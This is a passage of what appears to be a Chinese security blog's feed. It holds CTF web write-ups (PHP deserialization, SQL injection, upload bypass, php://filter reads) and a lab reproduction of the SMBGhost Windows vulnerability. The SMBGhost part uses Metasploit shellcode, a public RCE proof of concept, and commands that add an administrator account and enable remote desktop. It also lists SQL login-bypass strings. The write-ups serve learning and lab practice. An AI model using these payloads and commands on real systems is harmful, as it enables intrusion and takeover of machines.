&quot;;            echo $this-&gt;username;echo &quot;&lt;/br&gt;&quot;;            echo &quot;You password is: &quot;;            echo $this-&gt;password;echo &quot;&lt;/br&gt;&quot;;            die();        }        if ($this-&gt;username === &#39;admin&#39;) {            global $flag;            echo $flag;        }else{            echo &quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#39;t give you the flag!&quot;;            die();        }    }}?&gt;</code></pre><p>flag.php</p><pre><code class="php">&lt;?php$flag = &#39;Syc{dog_dog_dog_dog}&#39;;?&gt;</code></pre><p>可以看到在index.php中包含了class.php 代码如下</p><pre><code class="PHP">&lt;?php    include &#39;class.php&#39;;    $select = $_GET[&#39;select&#39;];    $res=unserialize(@$select);    ?&gt;</code></pre><p>从这几行代码中，推断与反序列化有关</p><p>然后看class.php几个关键函数</p><pre><code>__construct构造函数__wakeup函数__destruct析构函数</code></pre><p>关于__wakeup函数的漏洞，参考<a href>wakeup()函数漏洞以及实际漏洞分析</a></p><p><code>__wakeup()</code>漏洞，简要来说就是当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过<code>__wakeup()</code>的执行</p><p>这里我们需要构造username等于admin和password等于100来echo flag</p><pre><code class="PHP">&lt;?phpclass Name{    private $username = &#39;admin&#39;;    private $password = &#39;100&#39;;}$a = new Name();echo serialize($a);?&gt;</code></pre><p>得到O:4:”Name”:2:{s:14:”Nameusername”;s:5:”admin”;s:14:”Namepassword”;s:3:”100”;}</p><p>为了绕过<code>__wakeup()</code> 我们将2改为3</p><p>得到O:4:”Name”:3:{s:14:”Nameusername”;s:5:”admin”;s:14:”Namepassword”;s:3:”100”;}</p><p>然后关于private声明变量</p><p>private 声明的字段为私有字段，只在所声明的类中可见，在该类的子类和该类的对象实例中均不可见。因此私有字段的字段名在序列化时，类名和字段名前面都会加上\0的前缀。字符串长度也包括所加前缀的长度。其中 \0 字符也是计算长度的。</p><p>因此我们在类名和字段名前面加上\0的前缀，而\0 在url栏中会出现空白符，复制的时候丢失，所以我们加上%00</p><p>最后得到payload</p><pre><code>?select=O:4:&quot;Name&quot;:3:{s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;s:3:&quot;100&quot;;}</code></pre>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;题目地址:&lt;a href=&quot;https://buuoj.cn/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;buuctf&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="ctf" scheme="http://lingxin16.github.io/tags/ctf/"/>
    
      <category term="web" scheme="http://lingxin16.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>极客大挑战2019-LoveSQL</title>
    <link href="http://lingxin16.github.io/2020/06/11/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-LoveSQL/"/>
    <id>http://lingxin16.github.io/2020/06/11/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-LoveSQL/</id>
    <published>2020-06-11T13:56:16.000Z</published>
    <updated>2020-06-11T14:38:55.698Z</updated>
    
    <content type="html"><![CDATA[<p>题目地址:<a href="https://buuoj.cn/" target="_blank" rel="noopener">buuctf</a></p><a id="more"></a><p>打开题目  熟悉的界面</p><p><img src="/2020/06/11/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-LoveSQL/1.png" alt="1"></p><p>有一行红字用 sqlmap 是没有灵魂的 用sqlmap跑一下，但是失败了</p><p>还是手动吧   用万能密码登录得到</p><p><img src="/2020/06/11/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-LoveSQL/2.png" alt="2"></p><p>登陆成功，并提示密码，密码尝试用md5爆破无果</p><p>然后就是普通的sql注入了..</p><p>username=1’order by 1#</p><p><img src="/2020/06/11/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-LoveSQL/3.png" alt="3"></p><p><img src="/2020/06/11/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-LoveSQL/4.png" alt="4"></p><p>username=1’order by 4#的时候出现Unknown column ‘4’ in ‘order clause’</p><p>说明总共有三个字段</p><p>username=1’union select 1,2,3 #</p><p><img src="/2020/06/11/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-LoveSQL/5.png" alt="5"></p><p>得到回显点2和3</p><p>username=1’union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()#</p><p><img src="/2020/06/11/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-LoveSQL/6.png" alt="6"></p><p>得到两个表geekuser和l0ve1ysq1</p><p>username=1’union select 1,group_concat(column_name),3 from information_schema.columns where table_name=’geekuser’#</p><p><img src="/2020/06/11/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-LoveSQL/7.png" alt="7"></p><p>得到三个字段id，username和password</p><p>爆破这三个字段</p><p>username=1’union select 1,group_concat(id,username,password),3 from geekuser#</p><p><img src="/2020/06/11/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-LoveSQL/8.png" alt="8"></p><p>没有flag</p><p>接下来换l0ve1ysq1表 </p><p>username=1’union select 1,group_concat(column_name),3 from information_schema.columns where table_name=’l0ve1ysq1’#</p><p>得到一样的三个字段 </p><p><img src="/2020/06/11/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-LoveSQL/9.png" alt="9"></p><p>爆破这三个字段</p><p>1’union select 1,group_concat(id,username,password),3 from l0ve1ysq1#</p><p>得到flag</p><p><img src="/2020/06/11/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-LoveSQL/10.png" alt="10"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;题目地址:&lt;a href=&quot;https://buuoj.cn/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;buuctf&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="ctf" scheme="http://lingxin16.github.io/tags/ctf/"/>
    
      <category term="web" scheme="http://lingxin16.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2020-0796复现</title>
    <link href="http://lingxin16.github.io/2020/06/08/CVE-2020-0796%E5%A4%8D%E7%8E%B0/"/>
    <id>http://lingxin16.github.io/2020/06/08/CVE-2020-0796%E5%A4%8D%E7%8E%B0/</id>
    <published>2020-06-08T06:06:29.000Z</published>
    <updated>2020-06-08T09:42:40.468Z</updated>
    
    <content type="html"><![CDATA[<p>最近发布的一个Windows漏洞，有时间来复现一下</p><a id="more"></a><h3 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h3><p>有关此漏洞的详细介绍:<a href="https://www.freebuf.com/vuls/233263.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/233263.html</a></p><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>利用Windows10 1903版本来进行复现 </p><h4 id="镜像下载与安装"><a href="#镜像下载与安装" class="headerlink" title="镜像下载与安装"></a>镜像下载与安装</h4><pre><code>镜像：ed2k://|file|cn_windows_10_business_editions_version_1903_x64_dvd_e001dd2c.iso|4815527936|47D4C57E638DF8BF74C59261E2CE702D|</code></pre><p>安装镜像</p><p><img src="/2020/06/08/CVE-2020-0796%E5%A4%8D%E7%8E%B0/1.png" alt="1"></p><h4 id="虚拟机信息"><a href="#虚拟机信息" class="headerlink" title="虚拟机信息"></a>虚拟机信息</h4><p>Windows10 1903版本</p><p>ip：192.168.1.104</p><h4 id="漏洞扫描"><a href="#漏洞扫描" class="headerlink" title="漏洞扫描"></a>漏洞扫描</h4><p>攻击机</p><p>工具：SMBGhost</p><pre><code>python3 scanner.py 192.168.1.104</code></pre><p><img src="/2020/06/08/CVE-2020-0796%E5%A4%8D%E7%8E%B0/2.png" alt="2"></p><p>靶机</p><p>工具：奇安信检测工具</p><p><img src="/2020/06/08/CVE-2020-0796%E5%A4%8D%E7%8E%B0/3.png" alt="3"></p><h4 id="使用metasploit生成buf"><a href="#使用metasploit生成buf" class="headerlink" title="使用metasploit生成buf"></a>使用metasploit生成buf</h4><pre><code>msfvenom -p windows/x64/meterpreter/bind_tcp lport=6666 -f py -o tool.py </code></pre><p><img src="/2020/06/08/CVE-2020-0796%E5%A4%8D%E7%8E%B0/4.png" alt="4"></p><p>将SMBGhost_RCE_PoC中的exploit.py中的USER_OAYLOAD更换为刚刚生成的buf</p><p><img src="/2020/06/08/CVE-2020-0796%E5%A4%8D%E7%8E%B0/5.png" alt="5"></p><h4 id="使用metasploit对6666端口进行监听"><a href="#使用metasploit对6666端口进行监听" class="headerlink" title="使用metasploit对6666端口进行监听"></a>使用metasploit对6666端口进行监听</h4><pre><code>msfconsoleuse exploit/multi/handlerset payload windows/x64/meterpreter/bind_tcpshow optionsset LPORT 6666set RHOST 192.168.1.104exploit</code></pre><p><img src="/2020/06/08/CVE-2020-0796%E5%A4%8D%E7%8E%B0/6.png" alt="6"></p><h4 id="运行exploit-py"><a href="#运行exploit-py" class="headerlink" title="运行exploit.py"></a>运行exploit.py</h4><pre><code>python3 exploit.py -ip 192.168.1.104</code></pre><p><img src="/2020/06/08/CVE-2020-0796%E5%A4%8D%E7%8E%B0/7.png" alt="7"></p><p>这里打下去靶机会出现蓝屏重启的现象，多试几次就好</p><p><img src="/2020/06/08/CVE-2020-0796%E5%A4%8D%E7%8E%B0/8.png" alt="8"></p><p>拿到shell</p><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><h4 id="添加用户"><a href="#添加用户" class="headerlink" title="添加用户"></a>添加用户</h4><pre><code>net user d1a0 password /add</code></pre><h4 id="加入管理组"><a href="#加入管理组" class="headerlink" title="加入管理组"></a>加入管理组</h4><pre><code>net localgroup Administrators d1a0 /addnet localgroup Users d1a0 /del</code></pre><h4 id="查看用户信息"><a href="#查看用户信息" class="headerlink" title="查看用户信息"></a>查看用户信息</h4><pre><code>net user</code></pre><p><img src="/2020/06/08/CVE-2020-0796%E5%A4%8D%E7%8E%B0/9.png" alt="9"></p><h4 id="开启远程连接功能"><a href="#开启远程连接功能" class="headerlink" title="开启远程连接功能"></a>开启远程连接功能</h4><pre><code>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</code></pre><p><img src="/2020/06/08/CVE-2020-0796%E5%A4%8D%E7%8E%B0/10.png" alt="10"></p><p><img src="/2020/06/08/CVE-2020-0796%E5%A4%8D%E7%8E%B0/11.png" alt="11"></p><p><img src="/2020/06/08/CVE-2020-0796%E5%A4%8D%E7%8E%B0/12.png" alt="12"></p><p>工具地址：</p><p>SMBGhost：<a href="https://github.com/ollypwn/SMBGhost" target="_blank" rel="noopener">https://github.com/ollypwn/SMBGhost</a></p><p>奇安信检测工具：<a href="http://dl.qianxin.com/skylar6/CVE-2020-0796-Scanner.zip" target="_blank" rel="noopener">http://dl.qianxin.com/skylar6/CVE-2020-0796-Scanner.zip</a></p><p>SMBGhost_RCE_PoC：<a href="https://github.com/chompie1337/SMBGhost_RCE_PoC.git" target="_blank" rel="noopener">https://github.com/chompie1337/SMBGhost_RCE_PoC.git</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最近发布的一个Windows漏洞，有时间来复现一下&lt;/p&gt;
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>计算机网络原理学习</title>
    <link href="http://lingxin16.github.io/2020/06/07/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0/"/>
    <id>http://lingxin16.github.io/2020/06/07/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0/</id>
    <published>2020-06-07T03:32:24.000Z</published>
    <updated>2020-06-20T14:25:51.147Z</updated>
    
    <content type="html"><![CDATA[<a id="more"></a><h3 id="OSI和TCP-IP网络模型"><a href="#OSI和TCP-IP网络模型" class="headerlink" title="OSI和TCP.IP网络模型"></a>OSI和TCP.IP网络模型</h3><p>OSI网络模型(参考模型) 分为七层</p><p>应用层                         用户接口                                                                                                                    HTTP Telnet</p><p>表示层                         数据的表现形式、特定功能的实现例如加密                                                          ASCll、ENCDIC 、JPEG   </p><p>会话层                         对应用会话的管理、同步                                                                                         操作系统、应用读取</p><p>传输层                         可靠与不可靠的传输、传输前的错误检测、流控                                                  TCP(可靠)/UDP(不可靠)</p><p>网络层                         提供逻辑地址、选路                                                                                                 IP</p><p>数据链路层                 成帧、用Mac地址访问媒介、错误检测与修正                                                       802.3/802.2       HDLC/FR/PPP</p><p>物理层                         设备之间的比特流传输、物理接口、电气特性等                                                   EIA/TIA-232            V.35/RJ45</p><p>TCP/IP协议栈</p><p>应用层</p><p>传输层</p><p>网络层</p><p>网络接口层</p><p>对比</p><p><img src="/2020/06/07/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0/1.png" alt="1"></p><h3 id="网络设备"><a href="#网络设备" class="headerlink" title="网络设备"></a>网络设备</h3><p>路由器 、交换机、防火墙(硬件)等</p><h3 id="以太网"><a href="#以太网" class="headerlink" title="以太网"></a>以太网</h3><p>双绞线制作的两种标准以及线序</p><p>EIA/TIA 568A             绿白   绿  橙白   蓝   蓝白   橙   棕白   棕</p><p>EIA/TIA 568B             橙白   橙  绿白   蓝   蓝白   绿   棕白   棕</p><p>标准以太网(10Mbit/s)  由IEEE802.3定义   通常只定位在网络的接入层</p><p>快速以太网(100Mbit/s)   IEEE802.3u标准</p><p>千兆以太网   对IEEE802.3以太网标准的扩展   两个标准(IEEE802.3z光纤羽铜缆、IEEE82.3AB双绞线)</p><h3 id="以太网设备工作原理"><a href="#以太网设备工作原理" class="headerlink" title="以太网设备工作原理"></a>以太网设备工作原理</h3><p>当交换机的Mac地址表中没有目标地址，就会引起泛洪</p><p>Mac地址表条目占满，可以引起Mac地址表泛洪攻击</p><h3 id="局域网"><a href="#局域网" class="headerlink" title="局域网"></a>局域网</h3><p>LAN（局域网）是有限区域内相对距离较近的计算机和其他组件的网络</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;a id=&quot;more&quot;&gt;&lt;/a&gt;

&lt;h3 id=&quot;OSI和TCP-IP网络模型&quot;&gt;&lt;a href=&quot;#OSI和TCP-IP网络模型&quot; class=&quot;headerlink&quot; title=&quot;OSI和TCP.IP网络模型&quot;&gt;&lt;/a&gt;OSI和TCP.IP网络模型&lt;/h3&gt;&lt;p&gt;OSI
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>SUCTF2019-CheckIn</title>
    <link href="http://lingxin16.github.io/2020/06/01/SUCTF2019-CheckIn/"/>
    <id>http://lingxin16.github.io/2020/06/01/SUCTF2019-CheckIn/</id>
    <published>2020-06-01T04:21:20.000Z</published>
    <updated>2020-06-01T06:38:20.811Z</updated>
    
    <content type="html"><![CDATA[<p>题目地址：<a href="https://buuoj.cn/" target="_blank" rel="noopener">buuctf</a></p><a id="more"></a><p>打开题目，发现是个文件上传类型的题目</p><p><img src="/2020/06/01/SUCTF2019-CheckIn/1.png" alt="1"></p><p>上传一句话木马尝试</p><p><img src="/2020/06/01/SUCTF2019-CheckIn/2.png" alt="2"></p><p>提示非法后缀 再次用png图片尝试</p><p><img src="/2020/06/01/SUCTF2019-CheckIn/3.png" alt="3"></p><p>提示上传文件中包含?</p><p>当上传其他类型的文件时(txt、html等)提示不是图片文件</p><p><img src="/2020/06/01/SUCTF2019-CheckIn/4.png" alt="4"></p><p>关于exif_imagetype我们百度一下</p><p><img src="/2020/06/01/SUCTF2019-CheckIn/5.png" alt="5"></p><p>exif_imagetype() 读取一个图像的第一个字节并检查其签名。说明我们可以在文件头部添加jpg类型图片的标志（FF D8 FF）来绕过并且用JavaScript语句写一句话来绕过对问号过滤</p><p><img src="/2020/06/01/SUCTF2019-CheckIn/6.png" alt="6"></p><p>接下来上传 上传成功</p><p><img src="/2020/06/01/SUCTF2019-CheckIn/7.png" alt="7"></p><p>但是当我们连接的时候发现并没有解析成功</p><p>这里我们用.user.ini来将jpg格式解析成php格式</p><p>关于.user.ini这里有一篇文章 <a href="https://wooyun.js.org/drops/user.ini文件构成的PHP后门.html" target="_blank" rel="noopener">user.ini文件构成的PHP后门</a></p><p>这是我写的一个.user.ini文件</p><p><img src="/2020/06/01/SUCTF2019-CheckIn/8.png" alt="8"></p><p>先把这个.user.ini文件上传 然后上传1.jpg</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;题目地址：&lt;a href=&quot;https://buuoj.cn/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;buuctf&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="ctf" scheme="http://lingxin16.github.io/tags/ctf/"/>
    
      <category term="web" scheme="http://lingxin16.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>极客大挑战2019-SecretFile</title>
    <link href="http://lingxin16.github.io/2020/05/30/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-SecretFile/"/>
    <id>http://lingxin16.github.io/2020/05/30/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-SecretFile/</id>
    <published>2020-05-30T03:41:37.000Z</published>
    <updated>2020-05-30T04:01:37.892Z</updated>
    
    <content type="html"><![CDATA[<p>题目地址:<a href="https://buuoj.cn/" target="_blank" rel="noopener">buuctf</a></p><a id="more"></a><p>打开题目</p><p><img src="/2020/05/30/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-SecretFile/1.png" alt="1"></p><p>把一切都放在那里了 说明我们需要找到隐藏信息，查看源代码</p><p><img src="/2020/05/30/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-SecretFile/2.png" alt="2"></p><p>发现./Archive_room.php</p><p>打开</p><p><img src="/2020/05/30/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-SecretFile/3.png" alt="3"></p><p>点击secret</p><p><img src="/2020/05/30/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-SecretFile/4.png" alt="4"></p><p>发现查阅结束，没看清么？回去再仔细看看吧。</p><p>多次尝试我们并没有发现有什么变化，那么使用burpsuit抓包</p><p><img src="/2020/05/30/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-SecretFile/5.png" alt="5"></p><p>选择send to repeater</p><p><img src="/2020/05/30/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-SecretFile/6.png" alt="6"></p><p>重放之后发现secr3t.php</p><p>访问</p><p><img src="/2020/05/30/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-SecretFile/7.png" alt="7"></p><p>发现flag.php 访问</p><p><img src="/2020/05/30/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-SecretFile/8.png" alt="8"></p><p>这次什么都没有，源代码中也没有任何发现，但是在secr3t.php中也有过滤，但是我们可以用filter协议，同样可以读取flag.php的内容</p><p>访问/secr3t.php?file=php://filter/convert.base64-encode/resource=flag.php</p><p><img src="/2020/05/30/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-SecretFile/9.png" alt="9"></p><p>下边的一串字符就是flag.php的内容的base64形式</p><p>然后base64解码得到</p><pre><code class="html">&lt;head&gt;    &lt;meta charset=&quot;utf-8&quot;&gt;    &lt;title&gt;FLAG&lt;/title&gt;&lt;/head&gt;&lt;body style=&quot;background-color:black;&quot;&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;    &lt;h1 style=&quot;font-family:verdana;color:red;text-align:center;&quot;&gt;啊哈！你找到我了！可是你看不到我QAQ~~~&lt;/h1&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;    &lt;p style=&quot;font-family:arial;color:red;font-size:20px;text-align:center;&quot;&gt;        &lt;?php            echo &quot;我就在这里&quot;;            $flag = &#39;flag{99d1cd98-c137-49fd-b4fa-caa468d75d01}&#39;;            $secret = &#39;jiAng_Luyuan_w4nts_a_g1rIfri3nd&#39;        ?&gt;    &lt;/p&gt;&lt;/body&gt;</code></pre><p>提交flag</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;题目地址:&lt;a href=&quot;https://buuoj.cn/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;buuctf&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="ctf" scheme="http://lingxin16.github.io/tags/ctf/"/>
    
      <category term="web" scheme="http://lingxin16.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>极客大挑战2019-Havefun</title>
    <link href="http://lingxin16.github.io/2020/05/30/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-Havefun/"/>
    <id>http://lingxin16.github.io/2020/05/30/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-Havefun/</id>
    <published>2020-05-30T03:28:49.000Z</published>
    <updated>2020-05-30T03:37:31.942Z</updated>
    
    <content type="html"><![CDATA[<p>题目地址:<a href="https://buuoj.cn/" target="_blank" rel="noopener">buuctf</a></p><a id="more"></a><p>打开题目</p><p><img src="/2020/05/30/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-Havefun/1.png" alt="1"></p><p>并没有发现什么有用的信息，查看源代码发现</p><p><img src="/2020/05/30/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-Havefun/2.png" alt="2"></p><p>当我们传入一个cat参数，就把这个参数的值打印出来，当传入cat=dog时我们发现返回的值是一串类似flag的字符串</p><p>那么我们尝试?cat=dog 得到flag</p><p><img src="/2020/05/30/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-Havefun/3.png" alt="3"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;题目地址:&lt;a href=&quot;https://buuoj.cn/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;buuctf&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="ctf" scheme="http://lingxin16.github.io/tags/ctf/"/>
    
      <category term="web" scheme="http://lingxin16.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>roarctf2019-easy Calc</title>
    <link href="http://lingxin16.github.io/2020/05/29/roarctf2019-easy%20Calc/"/>
    <id>http://lingxin16.github.io/2020/05/29/roarctf2019-easy%20Calc/</id>
    <published>2020-05-29T04:57:33.000Z</published>
    <updated>2020-05-29T06:48:21.286Z</updated>
    
    <content type="html"><![CDATA[<p>题目地址:<a href="https://buuoj.cn/" target="_blank" rel="noopener">buuctf</a></p><a id="more"></a><p>打开题目是这样子的</p><p><img src="https://i.loli.net/2020/05/29/aKvcues4E6b5A2X.jpg" alt="QQ截图20200529130023"></p><p>类似一个计算器</p><p>在源代码中我们看到他增加了一个waf 还发现了calc.php</p><p><img src="https://i.loli.net/2020/05/29/Dk9zKLiOSrx4gTG.jpg" alt="QQ截图20200529130218.jpg"></p><p>打开calc.php可以看到他设置了黑名单</p><p><img src="https://i.loli.net/2020/05/29/UlnXEjeLzJVf2Ax.jpg" alt="QQ截图20200529130500.jpg"></p><p>那么我们就是要想法绕过</p><p>这里我们是选择用PHP的字符串解析来bypass</p><p>构造payload:</p><p>查看目录:calc.php?%20num=var_dump(scandir(chr(47)))</p><p><img src="https://i.loli.net/2020/05/29/xJOg6MXqyvweoSi.png" alt="1.png"></p><p>这里我们发现一个文件f1agg</p><p>读取f1agg:calc.php?%20num=file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))</p><p>得到flag</p><p>这里我们用HTTP走私漏洞同样也可以解这道题</p><p>参考<a href="https://www.plasf.cn/2019/10/16/2019-10-16-HTTP%E8%B5%B0%E7%A7%81%E6%BC%8F%E6%B4%9E-RoarCTF2019-easycalc/" target="_blank" rel="noopener">HTTP走私漏洞</a></p><p><img src="https://i.loli.net/2020/05/29/9LybDktjNHe6gJw.png" alt="2.png"></p><p><img src="https://i.loli.net/2020/05/29/xahgr3f9dWCqG4Z.png" alt="3.png"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;题目地址:&lt;a href=&quot;https://buuoj.cn/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;buuctf&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="ctf" scheme="http://lingxin16.github.io/tags/ctf/"/>
    
      <category term="web" scheme="http://lingxin16.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>极客大挑战2019-EasySQL</title>
    <link href="http://lingxin16.github.io/2020/05/29/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-EasySQL/"/>
    <id>http://lingxin16.github.io/2020/05/29/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-EasySQL/</id>
    <published>2020-05-29T04:30:36.000Z</published>
    <updated>2020-05-29T04:41:02.697Z</updated>
    
    <content type="html"><![CDATA[<p>题目地址:<a href="https://buuoj.cn/" target="_blank" rel="noopener">buuctf</a></p><a id="more"></a><p>打开题目</p><p><img src="/2020/05/29/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-EasySQL/QQ%E6%88%AA%E5%9B%BE20200529123305.jpg" alt="QQ截图20200529123305"></p><p>根据题目可以知道应该是个sql注入</p><p>先用万能密码尝试</p><p>用户名:admin’or 1=1#</p><p>密码:admin</p><p>登录成功，得到flag</p><p><img src="/2020/05/29/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-EasySQL/QQ%E6%88%AA%E5%9B%BE20200529123625.jpg" alt="QQ截图20200529123625"></p><p>这里给出一些不同语言类型的万能密码</p><table><thead><tr><th align="left">语言</th><th>万能密码</th></tr></thead><tbody><tr><td align="left">PHP</td><td>‘or 1=1/*<br>“or “a”=”a<br>“or 1=1–<br>“or”=”<br>“or”=”a’=’a<br>“or1=1–<br>“or=or”<br>‘’or’=’or’<br>‘) or (‘a’=’a<br>‘.).or.(‘.a.’=’.a<br>‘or 1=1<br>‘or 1=1–<br>‘or 1=1/*<br>‘or”=”a’=’a<br>‘or’ ‘1’=’1’<br>‘or’’=’<br>‘or’’=’’or’’=’<br>‘or’=’1’<br>‘or’=’or’<br>‘or.’a.’=’a<br>‘or1=1–<br>1’or’1’=’1<br>a’or’ 1=1–<br>a’or’1=1–<br>or ‘a’=’a’<br>or 1=1–<br>or1=1–</td></tr><tr><td align="left">asp aspx</td><td>“or “a”=”a<br>‘.).or.(‘.a.’=’.a<br>or 1=1–<br>‘or 1=1–<br>a’or’ 1=1–<br>“or 1=1–<br>‘or.’a.’=’a<br>“or”=”a’=’a<br>‘or’’=’<br>or’=’or’</td></tr><tr><td align="left">jsp</td><td>1’or’1’=’1<br>admin’ or 1=1/*</td></tr></tbody></table>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;题目地址:&lt;a href=&quot;https://buuoj.cn/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;buuctf&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="ctf" scheme="http://lingxin16.github.io/tags/ctf/"/>
    
      <category term="web" scheme="http://lingxin16.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>利用cloudflareWorkers制作Google镜像站</title>
    <link href="http://lingxin16.github.io/2020/05/11/%E5%88%A9%E7%94%A8cloudflareWorkers%E5%88%B6%E4%BD%9CGoogle%E9%95%9C%E5%83%8F%E7%AB%99/"/>
    <id>http://lingxin16.github.io/2020/05/11/%E5%88%A9%E7%94%A8cloudflareWorkers%E5%88%B6%E4%BD%9CGoogle%E9%95%9C%E5%83%8F%E7%AB%99/</id>
    <published>2020-05-11T01:43:04.000Z</published>
    <updated>2020-05-11T02:53:01.266Z</updated>
    
    <content type="html"><![CDATA[<p>今天在群里看到大佬弄的谷歌镜像站，于是也学着部署了一份</p><a id="more"></a><p>首先我们需要注册一个Cloudflare账号</p><p>cloudflare官网： <a href="https://www.cloudflare.com/" target="_blank" rel="noopener">https://www.cloudflare.com/</a></p><p>注册登录之后选择workers</p><p><img src="/2020/05/11/%E5%88%A9%E7%94%A8cloudflareWorkers%E5%88%B6%E4%BD%9CGoogle%E9%95%9C%E5%83%8F%E7%AB%99/QQ%E6%88%AA%E5%9B%BE20200511094942.jpg" alt="QQ截图20200511094942"></p><p>点击创建worker</p><p><img src="/2020/05/11/%E5%88%A9%E7%94%A8cloudflareWorkers%E5%88%B6%E4%BD%9CGoogle%E9%95%9C%E5%83%8F%E7%AB%99/QQ%E6%88%AA%E5%9B%BE20200511095051.jpg" alt="QQ截图20200511095051"></p><p>将下边的代码粘贴到左边代码框</p><pre><code>// Website you intended to retrieve for users.const upstream = &#39;www.google.com&#39;// Custom pathname for the upstream website.const upstream_path = &#39;/&#39;// Website you intended to retrieve for users using mobile devices.const upstream_mobile = &#39;www.google.com&#39;// Countries and regions where you wish to suspend your service.const blocked_region = [&#39;KP&#39;, &#39;SY&#39;, &#39;PK&#39;, &#39;CU&#39;]// IP addresses which you wish to block from using your service.const 